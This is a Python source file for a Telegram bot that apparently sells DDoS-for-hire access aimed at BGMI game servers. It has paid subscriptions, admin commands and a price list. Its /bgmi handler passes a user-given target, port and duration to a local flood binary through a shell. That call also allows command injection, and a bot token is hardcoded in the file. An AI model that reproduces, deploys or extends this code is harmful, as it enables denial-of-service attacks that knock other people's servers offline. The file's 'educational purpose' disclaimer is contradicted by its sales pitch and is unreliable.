#script by @venomXcrazy

import telebot
import subprocess
import datetime
import os

from keep_alive import keep_alive
keep_alive()
# insert your Telegram bot token here
bot = telebot.TeleBot('7983841091:AAGTYGHxkUdvkntVHw7V-hkM8xvNvGojrxU')

# Admin user IDs
admin_id = ["1809344653"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    admin_id = ["1809344653"]
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "🄻🄾🄶🅂 🄰🅁🄴 🄰🄻🅁🄴🄰🄳🅈 🄲🄻🄴🄰🅁🄴🄳 ❌."
            else:
                file.truncate(0)
                response = "🄻🄾🄶🅂 🄲🄻🄴🄰🅁🄴🄳 🅂🅄🄲🄲🄴🅂🅂🄵🅄🄻🄻🅈 ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

import datetime

# Dictionary to store the approval expiry date for each user
user_approval_expiry = {}

# Function to calculate remaining approval time
def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        if remaining_time.days < 0:
            return "Expired"
        else:
            return str(remaining_time)
    else:
        return "N/A"

# Function to add or update user approval expiry date
def set_approval_expiry_date(user_id, duration, time_unit):
    current_time = datetime.datetime.now()
    if time_unit == "hour" or time_unit == "hours":
        expiry_date = current_time + datetime.timedelta(hours=duration)
    elif time_unit == "day" or time_unit == "days":
        expiry_date = current_time + datetime.timedelta(days=duration)
    elif time_unit == "week" or time_unit == "weeks":
        expiry_date = current_time + datetime.timedelta(weeks=duration)
    elif time_unit == "month" or time_unit == "months":
        expiry_date = current_time + datetime.timedelta(days=30 * duration)  # Approximation of a month
    else:
        return False
    
    user_approval_expiry[user_id] = expiry_date
    return True

# Command handler for adding a user with approval time
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            duration_str = command[2]

            try:
                duration = int(duration_str[:-4])  # Extract the numeric part of the duration
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()  # Extract the time unit (e.g., 'hour', 'day', 'week', 'month')
                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                    raise ValueError
            except ValueError:
                response = "ɪɴᴠᴀʟɪᴅ ᴅᴜʀᴀᴛɪᴏɴ ғᴏʀᴍᴀᴛ. ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴘᴏsɪᴛɪᴠᴇ ɪɴᴛᴇɢᴇʀ ғᴏʟʟᴏᴡᴇᴅ ʙʏ 'hour(s)', 'day(s)', 'week(s)', or 'month(s)'."
                bot.reply_to(message, response)
                return

            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    response = f"User {user_to_add} added successfully for {duration} {time_unit}. Access will expire on {user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')} 👍."
                else:
                    response = "Failed to set approval expiry date. Please try again later."
            else:
                response = "🆄🆂🅴🆁 🅰🅻🆁🅴🅰🅳🆈 🅴🆇🅸🆂🆃🆂 🇦🇺."
        else:
            response = "ⓅⓁⒺⒶⓈⒺ 𝕊ℙ𝔼ℂ𝕀𝔽𝕐 🅰 𝐔𝐒𝐄𝐑 𝙸𝙳 𝔸ℕ𝔻 🅃🄷🄴 ⒹⓊⓇⒶⓉɪᴏɴ (e.g., 1hour, 2days, 3weeks, 4months) to add 😘."
    else:
        response = "ᴘᴜʀᴄʜᴀsᴇ 🆅🅸🅿  🄵🅁🄾🄼 🅞🅦🅝🅔🅡 @iam666bro"

    bot.reply_to(message, response)

# Command handler for retrieving user info
@bot.message_handler(commands=['myinfo'])
def get_user_info(message):
    user_id = str(message.chat.id)
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else "N/A"
    user_role = "Admin" if user_id in admin_id else "User"
    remaining_time = get_remaining_approval_time(user_id)
    response = f"🚀 Your Info:\n\n👾 User ID: <code>{user_id}</code>\n🇮🇳 Username: {username}\n🔫 Role: {user_role}\n📍 Approval Expiry Date: {user_approval_expiry.get(user_id, 'Not Approved')}\n💥 Remaining Approval Time: {remaining_time}"
    bot.reply_to(message, response, parse_mode="HTML")



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list ❌."
        else:
            response = '''Please specify a user id to remove. 
🔺️ Usage: /remove <userid>'''
    else:
        response = "ᴘᴜʀᴄʜᴀsᴇ 🆅🅸🅿  🄵🅁🄾🄼 🅞🅦🅝🅔🅡 @iam666bro"

    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "🄻🄾🄶🅂 🄲🄻🄴🄰🅁🄴🄳 🅂🅄🄲🄲🄴🅂🅂🄵🅄🄻🄻🅈 ✅"
        except FileNotFoundError:
            response = "🄻🄾🄶🅂 🄰🅁🄴 🄰🄻🅁🄴🄰🄳🅈 🄲🄻🄴🄰🅁🄴🄳 ❌."
    else:
        response = "ᴘᴜʀᴄʜᴀsᴇ 🆅🅸🅿  🄵🅁🄾🄼 🅞🅦🅝🅔🅡 @iam666bro"
    bot.reply_to(message, response)


@bot.message_handler(commands=['clearusers'])
def clear_users_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "USERS are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "users Cleared Successfully ✅"
        except FileNotFoundError:
            response = "users are already cleared ❌."
    else:
        response = "ᴘᴜʀᴄʜᴀsᴇ 🆅🅸🅿  🄵🅁🄾🄼 🅞🅦🅝🅔🅡 @iam666bro"
    bot.reply_to(message, response)

        
@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found ❌"
        except FileNotFoundError:
            response = "No data found ❌"
    else:
        response = "ᴘᴜʀᴄʜᴀsᴇ 🆅🅸🅿  🄵🅁🄾🄼 🅞🅦🅝🅔🅡 @iam666bro"
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ❌."
                bot.reply_to(message, response)
        else:
            response = "No data found ❌"
            bot.reply_to(message, response)
    else:
        response = "ᴘᴜʀᴄʜᴀsᴇ 🆅🅸🅿  🄵🅁🄾🄼 🅞🅦🅝🅔🅡 @iam666bro"
        bot.reply_to(message, response)


# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"💎{username}💎, 📍𝐏𝐀𝐂𝐊𝐄𝐓𝐒 𝐆𝐄𝐍𝐑𝐀𝐓𝐈𝐍𝐆 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.📍\n\n🚀 𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n🔺️ 𝐏𝐨𝐫𝐭: {port}\n💥 𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n💣 𝐌𝐞𝐭𝐡𝐨𝐝: Paid\n🛡️ 𝐏𝐫𝐨𝐱𝐲: 188.166.197.129:3128\n\n🏴‍☠️ 𝐀𝐝𝐯𝐢𝐜𝐞 :- 𝐘𝐨𝐮𝐫 𝐀𝐭𝐭𝐚𝐜𝐤 𝐖𝐢𝐥𝐥 𝐁𝐞 𝐅𝐢𝐧𝐢𝐬𝐡𝐞𝐝 𝐈𝐧 {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬 𝐖𝐚𝐢𝐭 𝐓𝐡𝐞𝐫𝐞 𝐖𝐢𝐭𝐡𝐨𝐮𝐭 𝐓𝐨𝐮𝐜𝐡𝐢𝐧𝐠 𝐀𝐧𝐲 𝐁𝐮𝐭𝐭𝐨𝐧"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "𝐘𝐎𝐔 𝐀𝐑𝐄 𝐎𝐍 𝐂𝐎𝐎𝐋𝐃𝐎𝐖𝐍 ❌. 𝐏𝐋𝐄𝐀𝐒𝐄 𝐖𝐀𝐈𝐓 𝟏𝟎 𝐒𝐄𝐂 𝐁𝐄𝐅𝐎𝐑𝐄 𝐑𝐔𝐍𝐍𝐈𝐍𝐆 𝐓𝐇𝐄 /bgmi 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 𝐀𝐆𝐀𝐈𝐍."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 1800:
                response = "Error: Time interval must be less than 1800."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} 50"
                process = subprocess.run(full_command, shell=True)
                response = f'''🔫 𝐏𝐀𝐂𝐊𝐄𝐓𝐒 𝐆𝐄𝐍𝐑𝐀𝐓𝐈𝐍𝐆 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄𝐃\n⚠️ 𝐍𝐎𝐖 𝐓𝐔𝐑𝐍 𝐎𝐅𝐅-𝐎𝐍 𝐘𝐎𝐔𝐑 𝐈𝐍𝐓𝐄𝐑𝐍𝐄𝐓 𝐀𝐍𝐃 𝐂𝐋𝐈𝐂𝐊 𝟐 𝐓𝐈𝐌𝐄𝐒 𝐎𝐍 𝐘𝐎𝐔𝐑 𝐃𝐄𝐕𝐈𝐂𝐄 𝐁𝐀𝐂𝐊 𝐁𝐔𝐓𝐓𝐎𝐍 -->  ⃤ 𝐘𝐎𝐔𝐑 𝐒𝐄𝐑𝐕𝐄𝐑 𝐖𝐈𝐋𝐋 𝐁𝐄 𝐔𝐍𝐅𝐑𝐄𝐄𝐙𝐄𝐃.'''
                # Notify the user that the attack is finished
        else:
            response = "🔺️ 𝐔𝐒𝐄 :- /𝐛𝐠𝐦𝐢 <𝐓𝐀𝐑𝐆𝐄𝐓> <𝐏𝐎𝐑𝐓> <𝐓𝐈𝐌𝐄>🔺️"  # Updated command syntax
    else:
        response = ("𝐘𝐎𝐔 𝐀𝐑𝐄 𝐍𝐎𝐓 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃")

    bot.reply_to(message, response)


# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "❌ No Command Logs Found For You ❌."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "🅨🅞🅤    🅐🅡🅔     🅝🅞🅣    🅞🅦🅝🅔🅡      🅞🅕      🅣🅗🅘🅢       🅑🅞🅣 📍."

    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''📍 Available commands:
🔺️ /bgmi : ᴍᴇᴛʜᴏᴅ ғᴏʀ ʙɢᴍɪ sᴇʀᴠᴇʀs. 
🔺️ /rules : ᴘʟᴇᴀsᴇ ᴄʜᴇᴄᴋ ʙᴇғᴏʀᴇ ᴜsᴇ!!.
🔺️ /mylogs : ᴛᴏ ᴄʜᴇᴄᴋ ʏᴏᴜʀ ʀᴇᴄᴇɴᴛs ᴀᴛᴛᴀᴄᴋs.
🔺️ /plan : ᴄʜᴇᴄᴋᴏᴜᴛ ᴏᴜᴛ ʙᴏᴛɴᴇᴛ ʀᴀᴛᴇs.
🔺️ /myinfo : ᴛᴏ ᴄʜᴇᴄᴋ ʏᴏᴜʀ ᴡʜᴏʟᴇ ɪɴғᴏ.

📣 𝕋𝕆 𝕊𝔼𝔼 𝔸𝔻𝕄𝕀ℕ ℂ𝕆𝕄𝕄𝔸ℕ𝔻𝕊:
🔺️ /admincmd : sʜᴏᴡ ᴀʟʟ ᴀᴅᴍɪɴ ᴄᴏᴍᴍᴀɴᴅs.

🅱🆄🆈 🅵🆁🅾🅼  :- @iam666bro
🄾🅆🄽🄴🅁 🄲🄷🄰🄽🄽🄴🄻 🄻🄸🄽🄺 :- https://t.me/MableSuck
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''👁️⃤ ᴡᴇʟᴄᴏᴍᴇ  𝐓𝐎 🄰🄽🅃🄸🅑🅐🅝 ⒹⒹⓄⓈ ᴮᴼᵀ  𝙳𝙴𝙰𝚁 💎@{user_name}!💎 TᕼIᔕ B̥ͦO̥ͦT̥ͦ ₵₳₦ 🅵🆄🅲🅺 🄱🄶🄼🄸 sᴇʀᴠᴇʀ 𝕊ᴏ 𝐔𝐒𝐄 𝕔ⓐ𝔯ᴇ𝘍𝑈𝙻𝙻𝗒.
💣 ʀᴜɴ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ /help 
📡 🅱🆄🆈 :- @iam666bro'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Ⓜⓤⓢⓣ 🅵🅾🅻🅻🅾🆆 𝕋ℍ𝕀𝕊 ʀᴜʟᴇs 🎭:
    
1. We are not responsible for any D-DoS attacks, send by our bot. This bot is only for educational purpose and it's source code freely available in github.!!
2. D-DoS Attacks will expose your IP Address to the Attacking server. so do it with your own risk. 
3. The power of D-DoS is enough to down any game's server. So kindly don't use it to down a website server..!!
For more : @iam666bro'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:

🅥🅘🅟🌟 :
-> 🅐🅣🅣🅐🅒🅚 🅢🅔🅒🅞🅝🅓🅢 : 1800 (S)
> 🄰🄵🅃🄴🅁 🄰🅃🅃🄰🄲🄺 🄻🄸🄼🄸🅃  : 5 sec
-> ℂ𝕆ℕℂ𝕌ℝℝ𝔼ℕ𝕋𝕊 𝔸𝕋𝕋𝔸ℂ𝕂 : 5

𝐏𝐑𝐈𝐂𝐄 𝐋𝐈𝐒𝐓 𝐇𝐄𝐑𝐄 💸 :
𝐃𝐀𝐘------>100 Rs
𝐖𝐄𝐄𝐊------>380 Rs
𝐌𝐎𝐍𝐓𝐇------>760 Rs
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

📍 /add <userId> : 𝐀𝐃𝐃 𝐀 𝐔𝐒𝐄𝐑.
📍 /remove <userid> 𝐑𝐄𝐌𝐎𝐕𝐄 𝐀 𝐔𝐒𝐄𝐑.
📍 /allusers : 𝐀𝐔𝐓𝐇𝐎𝐑𝐈𝐒𝐄𝐃 𝐔𝐒𝐄𝐑𝐒 𝐋𝐈𝐒𝐓𝐒.
📍 /logs : 𝐀𝐋𝐋 𝐔𝐒𝐄𝐑𝐒 𝐋𝐎𝐆𝐒.
📍 /broadcast : 𝐁𝐑𝐎𝐀𝐃𝐂𝐀𝐒𝐓 𝐀 𝐌𝐄𝐒𝐒𝐀𝐆𝐄.
📍 /clearlogs : 𝐂𝐋𝐄𝐀𝐑 𝐓𝐇𝐄 𝐋𝐎𝐆𝐒 𝐅𝐈𝐋𝐄.
📍 /clearusers : 𝐂𝐋𝐄𝐀𝐑 𝐓𝐇𝐄 𝐔𝐒𝐄𝐑𝐒 𝐅𝐈𝐋𝐄.
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users 👍."
        else:
            response = "🚀 ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴍᴇssᴀɢᴇ ᴛᴏ ʙʀᴏᴀᴅᴄᴀsᴛ."
    else:
        response = "🅨🅞🅤    🅐🅡🅔     🅝🅞🅣    🅞🅦🅝🅔🅡      🅞🅕      🅣🅗🅘🅢       🅑🅞🅣 📍."

    bot.reply_to(message, response)



#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)


